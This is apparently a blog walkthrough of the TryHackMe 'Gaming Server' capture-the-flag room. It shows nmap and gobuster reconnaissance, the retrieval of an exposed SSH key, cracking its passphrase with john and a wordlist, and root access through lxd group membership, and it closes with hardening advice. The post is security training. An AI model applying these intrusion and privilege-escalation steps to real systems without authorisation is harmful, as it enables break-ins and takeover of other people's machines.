---
layout: post
title:  "[THM walkthrough] - Gaming Server"
date:   2021-05-02 20:29:00 +0300
tags: tryhackme easy writeup walkthrough
categories: tryhackme
---
**Room URL**: <https://tryhackme.com/room/gamingserver>

**Difficulty**: Easy

## RECONNAISSANCE

I first started out by scanning the target for open ports and the services running on them.

```
$ nmap -vv -n -Pn -sV -oN services.nmap 10.10.189.82
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 17:13 EAT
NSE: Loaded 45 scripts for scanning.
Initiating Connect Scan at 17:14
Scanning 10.10.189.82 [1000 ports]
Discovered open port 80/tcp on 10.10.189.82
Discovered open port 22/tcp on 10.10.189.82
Increasing send delay for 10.10.189.82 from 0 to 5 due to 31 out of 102 dropped probes since last increase.
Increasing send delay for 10.10.189.82 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.189.82 from 10 to 20 due to max_successful_tryno increase to 5
Connect Scan Timing: About 24.06% done; ETC: 17:16 (0:01:38 remaining)
Completed Connect Scan at 17:15, 89.15s elapsed (1000 total ports)
Initiating Service scan at 17:15
Scanning 2 services on 10.10.189.82
Completed Service scan at 17:15, 9.96s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.189.82.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:15
Completed NSE at 17:15, 2.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:15
Completed NSE at 17:15, 2.70s elapsed
Nmap scan report for 10.10.189.82
Host is up, received user-set (0.29s latency).
Scanned at 2021-05-02 17:14:00 EAT for 104s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE    SERVICE       REASON      VERSION
22/tcp   open     ssh           syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http          syn-ack     Apache httpd 2.4.29 ((Ubuntu))
1113/tcp filtered ltp-deepspace no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.00 seconds
```

Since port 80 was running a web server (Apache), I decided to visit the HTTP service using a browser.

![Home page](/assets/thm/gamingserver/home-page.png)

After browsing around the site, I discovered an `/uploads/` folder with interesting content.

![Uploads folder](/assets/thm/gamingserver/uploads-folder.png)

I decided to download the content and investigate them.

**manifesto.txt**: very inspirational, but for the purpose of the exercise, I could only pick out a possible username 'The Mentor' as something useful.

**dict.lst**: a possible list of passwords for bruteforcing something.

**meme.jpg**: funny, but possibly hiding some steg information. After running steghide (with the `dict.lst` file) and stegoveritas on it, I realised there was nothing there after all.

After more reconnaissance, I discovered the index page had something interesting at the bottom of it's source code.

```
<snip of index.html>
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```

So it seemed that `john` was a more likely possible username.

After this, I decided to bruteforce the website's directories with GoBuster to find if some were hidden.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.189.82 -o dirs
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.189.82
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/02 18:01:54 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]  
/secret               (Status: 301) [Size: 313] [--> http://10.10.189.82/secret/]
/server-status        (Status: 403) [Size: 277]                                  
/uploads              (Status: 301) [Size: 314] [--> http://10.10.189.82/uploads/]

===============================================================
2021/05/02 18:05:57 Finished
===============================================================
```

In the `/secret/` directory, there was an SSH secret key file. This would be my way into the target.

![secret folder](/assets/thm/gamingserver/secret-folder.png)

## USER SHELL ACCESS

I proceeded to download the secret key file, transformed it to a proper format that `john` can recognise (with `ssh2john`) and then bruteforced it's passphrase using `john` and the `dict.lst` file.

```
$ wget http://10.10.189.82/secret/secretKey
$ chmod 600 secretKey
$ /usr/share/john/ssh2john.py secretKey > secretKey.hash
$ john --wordlist=dict.lst secretKey.hash > secretKey.pass
```

Once the passphrase was obtained and knowing that port 22 (running SSH) was open, I logged into the target via SSH as john and acquired the user flag in `user.txt` as required.

![Logging in as John](/assets/thm/gamingserver/login-as-john.png)

## PRIVILEGE ESCALATION

Uploading the linpeas script here: <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>, to the target, I used it to scope what ways I could achieve root privileges.

I found that the `john` user was in the `lxd` group.

```
john@exploitable:~$ groups
john adm cdrom sudo dip plugdev lxd
```

Using this knowledge, I created a container image, uploaded it to the target, created a container from it and mounted the target's root file system on it so as to interact with it as "root" through the container when running it in a privileged state. The steps I followed can be found here: <https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2>

![lxd privilege escalation](/assets/thm/gamingserver/lxd-priv-esc.png)

From there, I proceeded to find the root flag in `root.txt` as required.

```
~ # cd /mnt/root/root
/mnt/root/root # ls -lath
total 32
drwx------    3 root     root        4.0K Feb  5  2020 .
-rw-------    1 root     root          42 Feb  5  2020 .bash_history
-rw-------    1 root     root        1.1K Feb  5  2020 .viminfo
-rw-r--r--    1 root     root          33 Feb  5  2020 root.txt
drwxr-xr-x   24 root     root        4.0K Feb  5  2020 ..
drwx------    2 root     root        4.0K Feb  5  2020 .ssh
-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
/mnt/root/root # cat root.txt
```

## FINAL THOUGHTS

### My Security Recommendations

- Web security
  - Enforce thorough code review before deploying a web app, even if it's for testing purposes. Comments in code can give adversaries added information to use in their attack vectors.
  - Ensure sensitive files and folders are not exposed by the web app. This could be achieved by chrooting the web app to a particular directory or implementing jails.
    - <https://en.wikipedia.org/wiki/FreeBSD_jail>
    - <https://flylib.com/books/en/1.275.1.77/1/>

- Container security
  - Implement MAC (SElinux or AppArmor) and drop capabilities for non-admin users on lxc.
    - <https://www.section.io/engineering-education/getting-started-with-linux-container-security/>
  - Enforce use of unprivileged containers by default
  - Only secured administrative accounts should be added to `lxd/lxc` groups
